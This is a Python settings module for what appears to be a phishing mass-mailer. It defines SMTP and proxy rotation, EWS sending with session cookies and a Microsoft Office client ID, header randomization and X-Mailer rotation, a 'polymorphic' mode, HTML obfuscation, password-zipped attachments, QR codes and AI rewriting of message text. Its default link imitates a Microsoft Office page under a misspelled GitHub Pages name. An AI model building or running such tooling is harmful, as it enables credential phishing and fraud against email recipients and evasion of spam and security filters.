from pydantic import Field, FilePath, HttpUrl, field_validator
from pydantic import BaseModel
from pydantic_settings import BaseSettings, SettingsConfigDict
from typing import List, Dict, Optional
import configparser
import os
from dotenv import load_dotenv

# --- Load Environment Variables from .env ---
load_dotenv()

PROJECT_ROOT = os.path.dirname(__file__)

class GeneralSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    recipients_file: str = "recipients.txt"
    sending_method: str = "smtp"
    max_workers: int = 5
    send_sleep_seconds: int = 1
    connection_timeout: int = 15

class SmtpConfigModel(BaseModel):
    host: str
    port: int
    email: str
    password: str
    security: str
    limit: int = 0
    transport: str = 'smtp'
    # --- Runtime state, not from config ---
    warmup: Dict = {}
    sent_count: int = 0 # sent in current session
    fail_count: int = 0 # failed in current session
    disabled_until: Optional[float] = None # Cooldown timestamp
    total_sent: int = 0 # Lifetime sends for this SMTP
    domain_stats: Dict = Field(default_factory=dict) # Lifetime success/fail per domain
    average_latency: float = 0.0 # Moving average of send time
    reputation_events: List = Field(default_factory=list) # For AI feedback loop

class RecipientModel(BaseModel):
    email: str
    # Allow any other columns from the CSV/TXT file
    model_config = SettingsConfigDict(extra='allow')

class SenderSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    physical_address: str = "123 Main St, Anytown, USA 12345"

class EmailSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    email_subjects: List[str]
    company_phrase: str = "your recent transaction"
    message_file: List[str]
    link_url: List[HttpUrl] = []
    link_delivery_method: str = "safe_link"
    unsubscribe_url: str = "https://ashianverified-spec.github.io/secure_office_mcrosoft_homepage"
    dynamic_content_enabled: bool = True

class SmtpSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    smtp_servers: List[str] = []
    smtp_timeout: int = 15
    smtp_rotate_mode: str = "random"
    smtp_failure_threshold: int = 3
    smtp_cooldown_minutes: int = 30
    smtp_prioritize_healthy: bool = False
    smtp_limit_penalty_threshold: float = 0.8
    smtp_delete_sent: bool = False
    smtp_helo_name: str = "localhost.localdomain"
    # SES-specific settings
    smtp_ses_mode: bool = False
    smtp_configuration_set: str = "sentinel-ses"
    # Optional explicit AWS identity for stricter delivery reporting
    aws_identity_arn: Optional[str] = None

class AwsSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    aws_region: str = "eu-north-1"
    aws_access_key_id: Optional[str] = None
    aws_secret_access_key: Optional[str] = None

class HeadersSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    header_reply_to: Optional[str] = None
    header_priority: str = "3"
    header_add_random_x: bool = False
    header_return_path: Optional[str] = None
    header_use_custom: bool = False
    custom_headers: Dict[str, str] = Field(default_factory=dict)

    @field_validator('custom_headers', mode='before')
    @classmethod
    def _coerce_custom_headers(cls, v):
        if v is None or v == '':
            return {}
        if isinstance(v, dict):
            return v
        if isinstance(v, str):
            s = v.strip()
            if not s:
                return {}
            try:
                import json
                parsed = json.loads(s)
                if isinstance(parsed, dict):
                    return {str(k): str(v2) for k, v2 in parsed.items()}
            except Exception:
                pass
            return {}
        return {}

class AttachmentSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    attachment_send: bool = False
    attachment_file: Optional[str] = None
    attachment_display_name: Optional[str] = None
    attachment_dynamic_pdf: bool = False
    attachment_template_file: str = "attachment_template.html"
    attachment_pdf_orientation: str = "A4" # Missing from model
    attachment_zip_password: Optional[str] = None # Missing from model

class HtmlConversionSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    html_to_pdf: bool = False
    letter_image: bool = False # This setting is not used in the current message_builder.py
    obfuscate_html: bool = False # This setting is not used in the current message_builder.py and the corresponding function is removed
    enable_css_inlining: bool = True
class EncryptionSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    use_cipher: bool = False
    cipher_password: str = "default"
    cipher_random: int = -1
    cipher_strict: bool = False
    cipher_lines: int = 76

class DkimSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    dkim_enabled: bool = False
    dkim_selector: str = "default"
    dkim_private_key_file: Optional[str] = None

class SmimeSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    smime_sign: bool = False
    smime_key_password: Optional[str] = None

class LinkShortenerSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    shortener_enabled: bool = False

class WarmupSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    warmup_enabled: bool = False
    warmup_sends: int = 50
    warmup_initial_workers: int = 1
    warmup_ramp_up_sends: int = 10
    warmup_plain_text_only: bool = False
    warmup_daily_start: int = 50
    warmup_daily_increment: int = 10
    warmup_target_sends: int = 500

class ProxySettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    proxy_enabled: bool = False
    proxy_rotate_mode: str = "random"
    proxy_list: List[str] = []
    proxy_ai_connections: bool = False

class DeliverabilitySettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    header_randomize_mid_domain: bool = False
    header_x_mailer_rotation: bool = False
    send_time_window_start: int = 8
    send_time_window_end: int = 20
    per_hour_cap: int = 0

class MiscSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    retry_attempts: int = 3
    retry_delay_seconds: int = 5
    config_separator: str = "::"

class QrSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    qr_enabled: bool = False
    qr_scale: int = 10
    qr_border: int = 4
    qr_fg_color: str = "#000000"

class DevSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore', env_file='.env', env_file_encoding='utf-8')
    simulation_mode: bool = False
    verify_emails_before_send: bool = False
    verify_emails_local: bool = False
    verify_emails_compulsory: bool = False
    hunter_api_key: Optional[str] = None
    smtp_passwords: Dict[str, str] = Field(default_factory=dict)
    groq_api_key: Optional[str] = None
    gemini_api_key: Optional[str] = None

class EwsSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    ews_username: str = ""
    ews_use_oauth: bool = False
    ews_cookies: str = ""
    ews_save_sent_items: bool = False
    ews_client_id: str = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    ews_tenant_id: str = "common"
    ews_send_timeout: int = 60

class AiSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    ai_enabled: bool = False
    ai_rewrite_subject: bool = False
    ai_generate_intro: bool = False
    ai_rewrite_body: bool = False
    ai_classify_replies: bool = False
    ai_provider: str = "groq"
    ai_model: str = "llama-3.1-8b-instant"

class EmlSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    eml_enabled: bool = False
    eml_from_name: str = "Support"
    eml_attachment_name: str = "Forwarded Message"
    eml_letter_file: str = "eml_wrapper.txt"

class DeliverabilityTestSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    seed_list_file: str = "seed_list.txt"

class DomainThrottleSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    throttles: Dict[str, float] = Field(default_factory=lambda: {"default": 1.0})

class HealthMonitorSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    monitor_enabled: bool = False
    monitor_interval_minutes: int = 15

class SentinelSettings(BaseSettings):
    model_config = SettingsConfigDict(extra='ignore')
    sentinel_enabled: bool = False
    sentinel_trigger_threshold: float = 0.15
    sentinel_strict_mode: bool = False
    sentinel_strict_threshold: float = 0.50
    sentinel_polymorphic_mode: bool = True
    sentinel_adaptive_delivery: bool = True

class AppSettings(BaseModel):
    general: GeneralSettings
    email: EmailSettings
    smtp: SmtpSettings
    aws: AwsSettings
    headers: HeadersSettings
    attachment: AttachmentSettings
    html_conversion: HtmlConversionSettings
    encryption: EncryptionSettings
    dkim: DkimSettings
    smime: SmimeSettings
    link_shortener: LinkShortenerSettings
    warmup: WarmupSettings
    proxy: ProxySettings
    deliverability: DeliverabilitySettings
    misc: MiscSettings
    qr: QrSettings
    dev: DevSettings
    ews: EwsSettings
    ai: AiSettings
    eml: EmlSettings
    deliverability_test: DeliverabilityTestSettings
    domain_throttle: DomainThrottleSettings
    health_monitor: HealthMonitorSettings
    sentinel: SentinelSettings

def load_settings_from_ini(config_path: str) -> AppSettings:
    config = configparser.ConfigParser(inline_comment_prefixes=('#',))
    config.read(config_path)

    # Helper to get values safely
    def get_list(section, key):
        val = config.get(section, key, fallback='')
        sep = config.get('MISC', 'config_separator', fallback='::')
        return [item.strip() for item in val.split(sep) if item.strip()]

    # Map INI sections to Pydantic models
    return AppSettings(
        general=GeneralSettings(**dict(config.items('GENERAL'))) if config.has_section('GENERAL') else GeneralSettings(),
        email=EmailSettings(
            **{**dict(config.items('EMAIL')),
               'email_subjects': get_list('EMAIL', 'email_subjects'),
               'message_file': get_list('EMAIL', 'message_file'),
               'link_url': get_list('EMAIL', 'link_url')}
        ) if config.has_section('EMAIL') else EmailSettings(email_subjects=[], message_file=[]),
        smtp=SmtpSettings(
            **{**dict(config.items('SMTP')),
               'smtp_servers': get_list('SMTP', 'smtp_servers')}
        ) if config.has_section('SMTP') else SmtpSettings(),
        aws=AwsSettings(**dict(config.items('AWS'))) if config.has_section('AWS') else AwsSettings(),
        headers=HeadersSettings(**dict(config.items('HEADERS'))) if config.has_section('HEADERS') else HeadersSettings(),
        attachment=AttachmentSettings(**dict(config.items('ATTACHMENT'))) if config.has_section('ATTACHMENT') else AttachmentSettings(),
        html_conversion=HtmlConversionSettings(**dict(config.items('HTML_CONVERSION'))) if config.has_section('HTML_CONVERSION') else HtmlConversionSettings(),
        encryption=EncryptionSettings(**dict(config.items('ENCRYPTION'))) if config.has_section('ENCRYPTION') else EncryptionSettings(),
        dkim=DkimSettings(**dict(config.items('DKIM'))) if config.has_section('DKIM') else DkimSettings(),
        smime=SmimeSettings(**dict(config.items('SMIME'))) if config.has_section('SMIME') else SmimeSettings(),
        link_shortener=LinkShortenerSettings(**dict(config.items('LINK_SHORTENER'))) if config.has_section('LINK_SHORTENER') else LinkShortenerSettings(),
        warmup=WarmupSettings(**dict(config.items('WARMUP'))) if config.has_section('WARMUP') else WarmupSettings(),
        proxy=ProxySettings(**{
            **dict(config.items('PROXY')), 
            'proxy_list': get_list('PROXY', 'proxy_list'),
            'proxy_enabled': config.getboolean('PROXY', 'proxy_enabled', fallback=False)
        }) if config.has_section('PROXY') else ProxySettings(),
        deliverability=DeliverabilitySettings(**dict(config.items('DELIVERABILITY'))) if config.has_section('DELIVERABILITY') else DeliverabilitySettings(),
        misc=MiscSettings(**dict(config.items('MISC'))) if config.has_section('MISC') else MiscSettings(),
        qr=QrSettings(**dict(config.items('QR'))) if config.has_section('QR') else QrSettings(),
        dev=DevSettings(**dict(config.items('DEV'))) if config.has_section('DEV') else DevSettings(),
        ews=EwsSettings(**dict(config.items('EWS'))) if config.has_section('EWS') else EwsSettings(),
        ai=AiSettings(**dict(config.items('AI'))) if config.has_section('AI') else AiSettings(),
        eml=EmlSettings(**dict(config.items('EML'))) if config.has_section('EML') else EmlSettings(),
        deliverability_test=DeliverabilityTestSettings(**dict(config.items('DELIVERABILITY_TEST'))) if config.has_section('DELIVERABILITY_TEST') else DeliverabilityTestSettings(),
        domain_throttle=DomainThrottleSettings(**dict(config.items('DOMAIN_THROTTLE'))) if config.has_section('DOMAIN_THROTTLE') else DomainThrottleSettings(),
        health_monitor=HealthMonitorSettings(**dict(config.items('HEALTH_MONITOR'))) if config.has_section('HEALTH_MONITOR') else HealthMonitorSettings(),
        sentinel=SentinelSettings(**dict(config.items('SENTINEL'))) if config.has_section('SENTINEL') else SentinelSettings()
    )

CONFIG_FILE = os.path.join(PROJECT_ROOT, 'config', 'config.ini')
settings = load_settings_from_ini(CONFIG_FILE)